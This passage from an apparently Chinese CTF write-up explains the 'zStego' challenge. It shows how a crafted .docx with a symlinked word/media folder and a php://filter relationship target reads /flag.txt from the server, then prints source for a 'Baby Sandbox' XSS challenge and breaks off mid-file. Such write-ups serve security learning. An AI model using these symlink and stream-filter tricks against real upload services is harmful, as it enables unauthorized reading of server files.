invoke__">register_shutdown_function</span>(<span class="hljs-string">&#x27;cleanup&#x27;</span>, <span class="hljs-variable">$tmpDir</span>); <span class="hljs-comment">// cleanup in the end</span><br><br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$tmpDir</span>/word/media&quot;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br><br><span class="hljs-variable">$messages</span> = [];<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$relsDom</span>-&gt;Relationship <span class="hljs-keyword">as</span> <span class="hljs-variable">$rel</span>) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$rel</span>[<span class="hljs-string">&#x27;Type&#x27;</span>] == <span class="hljs-string">&#x27;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image&#x27;</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">str_starts_with</span>(<span class="hljs-variable">$rel</span>[<span class="hljs-string">&#x27;Target&#x27;</span>], <span class="hljs-string">&#x27;media/&#x27;</span>))<br>            <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$rel</span>[<span class="hljs-string">&#x27;Target&#x27;</span>], <span class="hljs-number">6</span>);<br><br>        <span class="hljs-variable">$file</span> = @<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> === <span class="hljs-literal">false</span>) <span class="hljs-comment">// Object relationship table points to inexistent file. Document may be corrupted</span><br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-variable">$result</span> = @<span class="hljs-title function_ invoke__">zlib_decode</span>(<span class="hljs-variable">$file</span>); <span class="hljs-comment">// This will expose them hackers!</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span> !== <span class="hljs-literal">false</span>)<br>            <span class="hljs-variable">$messages</span>[] = <span class="hljs-variable">$result</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// cleanup</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;rm -rf <span class="hljs-subst">$tmpDir</span>&quot;</span>);<br><br><span class="hljs-meta">?&gt;</span><br>   &lt;!DOCTYPE html&gt;<br>    &lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br>    &lt;head&gt;<br>        &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>        &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;<br>        &lt;title&gt;zStego - Results&lt;/title&gt;<br>        &lt;link href=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;<br>    &lt;/head&gt;<br>    &lt;body <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">bg</span>-<span class="hljs-title">light</span>&quot;&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">container</span> <span class="hljs-title">text</span>-<span class="hljs-title">center</span> <span class="hljs-title">mt</span>-5&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">h1</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">display</span>-4&quot;&gt;<span class="hljs-title">Scan</span> <span class="hljs-title">Results</span>&lt;/<span class="hljs-title">h1</span>&gt;</span><br><span class="hljs-class">            &lt;?<span class="hljs-title">php</span> <span class="hljs-title">if</span> (!<span class="hljs-title">empty</span>($<span class="hljs-title">messages</span>)): ?&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">alert</span> <span class="hljs-title">alert</span>-<span class="hljs-title">success</span> <span class="hljs-title">mt</span>-4&quot;&gt;</span><br><span class="hljs-class">                    &lt;<span class="hljs-title">h4</span>&gt;<span class="hljs-title">Hidden</span> <span class="hljs-title">Messages</span> <span class="hljs-title">Found</span>:&lt;/<span class="hljs-title">h4</span>&gt;</span><br><span class="hljs-class">                    &lt;<span class="hljs-title">ul</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">list</span>-<span class="hljs-title">group</span>&quot;&gt;</span><br><span class="hljs-class">                        &lt;?<span class="hljs-title">php</span> <span class="hljs-title">foreach</span> ($<span class="hljs-title">messages</span> <span class="hljs-title">as</span> $<span class="hljs-title">message</span>): ?&gt;</span><br><span class="hljs-class">                            &lt;<span class="hljs-title">li</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">list</span>-<span class="hljs-title">group</span>-<span class="hljs-title">item</span>&quot;&gt; &lt;?= <span class="hljs-title">htmlspecialchars</span>($<span class="hljs-title">message</span>) ?&gt; &lt;/<span class="hljs-title">li</span>&gt;</span><br><span class="hljs-class">                        &lt;?<span class="hljs-title">php</span> <span class="hljs-title">endforeach</span>; ?&gt;</span><br><span class="hljs-class">                    &lt;/<span class="hljs-title">ul</span>&gt;</span><br><span class="hljs-class">                &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">            &lt;?<span class="hljs-title">php</span> <span class="hljs-title">else</span>: ?&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">alert</span> <span class="hljs-title">alert</span>-<span class="hljs-title">info</span> <span class="hljs-title">mt</span>-4&quot;&gt;<span class="hljs-title">No</span> <span class="hljs-title">hidden</span> <span class="hljs-title">messages</span> <span class="hljs-title">found</span>.&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">            &lt;?<span class="hljs-title">php</span> <span class="hljs-title">endif</span>; ?&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>=&quot;<span class="hljs-title">index</span>.<span class="hljs-title">php</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">btn</span> <span class="hljs-title">btn</span>-<span class="hljs-title">secondary</span> <span class="hljs-title">mt</span>-3&quot;&gt;<span class="hljs-title">Back</span> <span class="hljs-title">to</span> <span class="hljs-title">Home</span>&lt;/<span class="hljs-title">a</span>&gt;</span><br><span class="hljs-class">        &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">body</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">html</span>&gt;</span><br><span class="hljs-class"></span><br></code></pre></td></tr></table></figure><p>阅读源码知道，我们要上传一个<code>docx</code>文档，必须保证格式完整,再<code>document.xml.rels</code>必须有一个<code> http://schemas.openxmlformats.org/officeDocument/2006/relationships/image</code>关系，指向media的一个文件，他会用<code>file_get_contents</code>函数去包含文件</p><p>思路：我首先想到的是目录穿越，但是他设置了<code>open_basedir</code>禁止了目录穿越、那就考虑php伪协议去绕过<code>open_basedir</code></p><p>添加一个<code>&lt;Relationship&gt;</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Relationship</span> <span class="hljs-attr">Id</span>=<span class="hljs-string">&quot;rId1&quot;</span> <span class="hljs-attr">Type</span>=<span class="hljs-string">&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles&quot;</span> <span class="hljs-attr">Target</span>=<span class="hljs-string">&quot;media/php://filter/read=convert.zlib.deflate/resource=/flag.txt&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Relationships</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>Target</code>指向<code>media/php://filter/read=convert.zlib.deflate/resource=/flag.txt</code>那么文件包含时就会包含<code>zilb</code>编码后的<code>/flag.txt</code>最后输出会将其解码</p><p>首先建立一个<code>1.docx</code>，改后缀<code>zip</code>解码，再<code>document.xml.rels</code>添加一个<code>&lt;Relationship&gt;</code>再压缩为<code>zip</code>改为docx上传，但是没结果</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250223165318566.png" alt="image-20250223165318566"></p><p>后面查询资料知道不是所有的<code>php://</code>伪协议都可以绕过<code>open_basedir</code>只有不依赖文件系统的才可以绕过</p><p>显然<code>php://filter</code>不行，</p><p>一个新的思路是利用软链接</p><p>我们发现他是使用的<code>unzip</code>来进行解压的，<code>unzip</code>由于它保留了可能包含在引用压缩文件中的符号链接，因此被认为是不安全的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$tmpDir</span> = <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;mktemp -d --tmpdir=/tmp/ zipXXXXXXXXX&quot;</span>);<br><span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;unzip <span class="hljs-subst">$zipFilename</span> \&quot;word/media*\&quot; -d \&quot;<span class="hljs-subst">$tmpDir</span>\&quot;&quot;</span>);<br></code></pre></td></tr></table></figure><p>再看看<code>open_basedir</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$tmpDir</span>/word/media&quot;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br></code></pre></td></tr></table></figure><p>我们发现他的<code>open_basedir</code>是利用的通配符，是直接设置的，那么我们可以通过提前设置<code>word/medi</code>链接到<code>/flag.txt</code>来实现拿到flag</p><p>该<code>word/media</code>文件夹不是由 php 代码创建的，而是文件本身提取的结果<code>.docx</code>，这意味着没有什么可以阻止我们将此文件夹本身定义为符号链接。如果我们将其符号链接到，<code>/</code>那么我们将能够包含文件系统中我们知道名称的任何文件，包括标志。我们可以<code>ln</code>在我们的<code>word</code>目录中通过以下方式创建符号链接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s / media<br></code></pre></td></tr></table></figure><p>这次，由于我们想要泄露 的内容<code>/flag.txt</code>（或者<code>word/media/flag.txt</code>因为它是符号链接到 的<code>/</code>），因此我们需要编辑<code>word/_rels/document.xml.rels</code>文件以更改我们假定图像的路径。PHP 代码唯一验证的是关系的类型，因此我们可以输入我们想要的任何路径。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> standalone=<span class="hljs-string">&quot;yes&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">Relationships</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://schemas.openxmlformats.org/package/2006/relationships&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">Relationship</span> <span class="hljs-attr">Id</span>=<span class="hljs-string">&quot;rId3&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">Type</span>=<span class="hljs-string">&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">Target</span>=<span class="hljs-string">&quot;webSettings.xml&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">Relationship</span> <span class="hljs-attr">Id</span>=<span class="hljs-string">&quot;rId2&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">Type</span>=<span class="hljs-string">&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">Target</span>=<span class="hljs-string">&quot;settings.xml&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">Relationship</span> <span class="hljs-attr">Id</span>=<span class="hljs-string">&quot;rId1&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">Type</span>=<span class="hljs-string">&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">Target</span>=<span class="hljs-string">&quot;styles.xml&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">Relationship</span> <span class="hljs-attr">Id</span>=<span class="hljs-string">&quot;rId6&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">Type</span>=<span class="hljs-string">&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">Target</span>=<span class="hljs-string">&quot;theme/theme1.xml&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">Relationship</span> <span class="hljs-attr">Id</span>=<span class="hljs-string">&quot;rId5&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">Type</span>=<span class="hljs-string">&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">Target</span>=<span class="hljs-string">&quot;fontTable.xml&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">Relationship</span> <span class="hljs-attr">Id</span>=<span class="hljs-string">&quot;rId4&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">Type</span>=<span class="hljs-string">&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">Target</span>=<span class="hljs-string">&quot;media/flag.txt&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Relationships</span>&gt;</span><br></code></pre></td></tr></table></figure><p>为了成功通过该<code>zlib_decode</code>线路，我们需要传递一些有效的 zlib 压缩数据。使用php的流过滤器来实现</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Relationship</span> <span class="hljs-attr">Id</span>=<span class="hljs-string">&quot;rId4&quot;</span></span><br><span class="hljs-tag">   <span class="hljs-attr">Type</span>=<span class="hljs-string">&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image&quot;</span></span><br><span class="hljs-tag">   <span class="hljs-attr">Target</span>=<span class="hljs-string">&quot;media/php://filter/zlib.deflate/resource=flag.txt&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>我们最后一次压缩文件以形成<code>.docx</code>文件并提交</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">zip -r --symlinks payload.docx *<br></code></pre></td></tr></table></figure><p><a href="https://learn-cyber.net/writeup/zStego">官方wp</a></p><h2 id="Baby-Sandbox"><a href="#Baby-Sandbox" class="headerlink" title="Baby Sandbox"></a>Baby Sandbox</h2><p>源码：</p><p>iframe.ejs:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs ejs">&lt;!DOCTYPE html&gt;<br>&lt;html lang=&quot;en&quot;&gt;<br>  &lt;head&gt;<br>    &lt;meta charset=&quot;UTF-8&quot; /&gt;<br>    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;<br>    &lt;title&gt;iframe&lt;/title&gt;<br>  &lt;/head&gt;<br>  &lt;body&gt;<br>    &lt;h1&gt;Your secret&lt;/h1&gt;<br>    &lt;div id=&quot;secret-container&quot;&gt;&lt;/div&gt;<br>    &lt;script&gt;<br>      (function() &#123;<br>        let container = document.getElementById(&quot;secret-container&quot;);<br>        let secretDiv = document.createElement(&quot;div&quot;);<br>        let shadow = secretDiv.attachShadow(&#123; mode: &quot;closed&quot; &#125;);<br>        <br>        let flagElement = document.createElement(&quot;span&quot;);<br>        flagElement.textContent =<br>          localStorage.getItem(&quot;secret&quot;) || &quot;TRX&#123;fake_flag_for_testing&#125;&quot;;<br>        shadow.appendChild(flagElement);<br>        <br>        localStorage.removeItem(&quot;secret&quot;);<br>        container.appendChild(secretDiv);<br>      &#125;)();<br>      <br>      let d = document.createElement(&quot;div&quot;);<br>      d.innerHTML = &quot;&lt;%= payload %&gt;&quot;;<br>      document.body.appendChild(d);<br>    &lt;/script&gt;<br>  &lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure><p>index.ejs:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs ejs">&lt;!DOCTYPE html&gt;<br>&lt;html lang=&quot;en&quot;&gt;<br>  &lt;head&gt;<br>    &lt;meta charset=&quot;UTF-8&quot; /&gt;<br>    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;<br>    &lt;title&gt;Hello&lt;/title&gt;<br>  &lt;/head&gt;<br>  &lt;body&gt;<br>    &lt;iframe<br>      srcdoc=&#x27;&lt;%= include(&quot;iframe&quot;, &#123; payload: payload &#125;) %&gt;&#x27;<br>      sandbox=&quot;allow-scripts allow-same-origin&quot;<br>    &gt;&lt;/iframe&gt;<br>  &lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure><p>bot.js:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// From ASIS CTF Finals 2024 - leakbin</span><br><br><span class="hljs-keyword">const</span> puppeteer = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;puppeteer&quot;</span>);<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PORT</span> = process.<span class="hljs-property">env</span>.<span class="hljs-property">PORT</span> || <span class="hljs-number">1337</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SITE</span> = <span class="hljs-string">`http://localhost:<span class="hljs-subst">$&#123;PORT&#125;</span>`</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">FLAG</span> = process.<span class="hljs-property">env</span>.<span class="hljs-property">FLAG</span> || <span class="hljs-string">&quot;TRX&#123;fake_flag_for_testing&#125;&quot;</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">FLAG_REGEX</span> = <span class="hljs-regexp">/^TRX&#123;[a-z0-9_]+&#125;$/</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">sleep</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">ms</span>) =&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> <span class="hljs-built_in">setTimeout</span>(resolve, ms));<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">visit</span> = (<span class="hljs-params">payload</span>) =&gt; &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-title function_">async</span> (resolve, reject) =&gt; &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable constant_">FLAG_REGEX</span>.<span class="hljs-title function_">test</span>(<span class="hljs-variable constant_">FLAG</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;Error: Flag does not match flag regex, contact an admin if this is on remote&quot;</span>));<br>        &#125;<br><br>        <span class="hljs-keyword">let</span> browser, context, page;<br>        <span class="hljs-keyword">try</span> &#123;<br>            browser = <span class="hljs-keyword">await</span> puppeteer.<span class="hljs-title function_">launch</span>(&#123;<br>                <span class="hljs-attr">headless</span>: <span class="hljs-literal">true</span>,<br>                <span class="hljs-attr">args</span>: [<br>                    <span class="hljs-string">&#x27;--no-sandbox&#x27;</span>,<br>                    <span class="hljs-string">&#x27;--disable-setuid-sandbox&#x27;</span>,<br>                    <span class="hljs-string">&#x27;--js-flags=--noexpose_wasm,--jitless&#x27;</span> <span class="hljs-comment">// this is a web chall :)</span><br>                ],<br>                <span class="hljs-attr">dumpio</span>: <span class="hljs-literal">true</span>,<br>                <span class="hljs-attr">pipe</span>: <span class="hljs-literal">true</span>,<br>                <span class="hljs-attr">executablePath</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">PUPPETEER_EXECUTABLE_PATH</span><br>            &#125;);<br><br>            <span class="hljs-comment">// incognito btw</span><br>            context = <span class="hljs-keyword">await</span> browser.<span class="hljs-title function_">createBrowserContext</span>();<br><br>            page = <span class="hljs-keyword">await</span> context.<span class="hljs-title function_">newPage</span>();<br>            <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">goto</span>(<span class="hljs-variable constant_">SITE</span>, &#123; <span class="hljs-attr">waitUntil</span>: <span class="hljs-string">&quot;domcontentloaded&quot;</span>, <span class="hljs-attr">timeout</span>: <span class="hljs-number">5000</span> &#125;);<br>            <br>            <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">evaluate</span>(<span class="hljs-function">(<span class="hljs-params">flag</span>) =&gt;</span> &#123;<br>                <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&quot;secret&quot;</span>, flag);<br>            &#125;, <span class="hljs-variable constant_">FLAG</span>);<br><br>            <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">close</span>();<br>        &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);<br>            <span class="hljs-keyword">if</span> (browser) <span class="hljs-keyword">await</span> browser.<span class="hljs-title function_">close</span>();<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;Error: Setup failed, if this happens consistently on remote contact an admin&quot;</span>));<br>        &#125;<br><br>        <span class="hljs-title function_">resolve</span>(<span class="hljs-string">&quot;Success!&quot;</span>);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            page = <span class="hljs-keyword">await</span> context.<span class="hljs-title function_">newPage</span>();<br>            <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">goto</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;SITE&#125;</span>?payload=<span class="hljs-subst">$&#123;<span class="hljs-built_in">encodeURIComponent</span>(payload)&#125;</span>`</span>, &#123; <span class="hljs-attr">waitUntil</span>: <span class="hljs-string">&quot;domcontentloaded&quot;</span>, <span class="hljs-attr">timeout</span>: <span class="hljs-number">5000</span> &#125;);<br>            <span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">1000</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (browser) <span class="hljs-keyword">await</span> browser.<span class="hljs-title function_">close</span>();<br>    &#125;);<br>&#125;;<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123; visit &#125;;<br><br></code></pre></td></tr></table></figure><p>server.js:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express&quot;</span>);<br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;path&quot;</span>);<br><span class="hljs-keyword">const</span> process = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;process&quot;</span>);<br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>()<br><span class="hljs-keyword">const</span> bot = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./bot&quot;</span>);<br><br><span class="hljs-keyword">let</span> <span class="hljs-variable constant_">PORT</span> = process.<span class="hljs-property">env</span>.<span class="hljs-property">PORT</span> || <span class="hljs-number">1337</span><br><br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> &#123;<br>    res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&quot;Content-Security-Policy&quot;</span>, <span class="hljs-string">&quot;default-src &#x27;none&#x27;; frame-ancestors &#x27;none&#x27;; base-uri &#x27;none&#x27;; form-action &#x27;none&#x27;; script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;;&quot;</span>);<br>    <span class="hljs-title function_">next</span>()<br>&#125;)<br><br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&quot;view engine&quot;</span>, <span class="hljs-string">&quot;ejs&quot;</span>)<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&quot;views&quot;</span>, path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&quot;views&quot;</span>))<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> payload = req.<span class="hljs-property">query</span>.<span class="hljs-property">payload</span> || <span class="hljs-string">&#x27;&lt;p&gt;Hello World&lt;/p&gt;&#x27;</span>;<br>    payload = 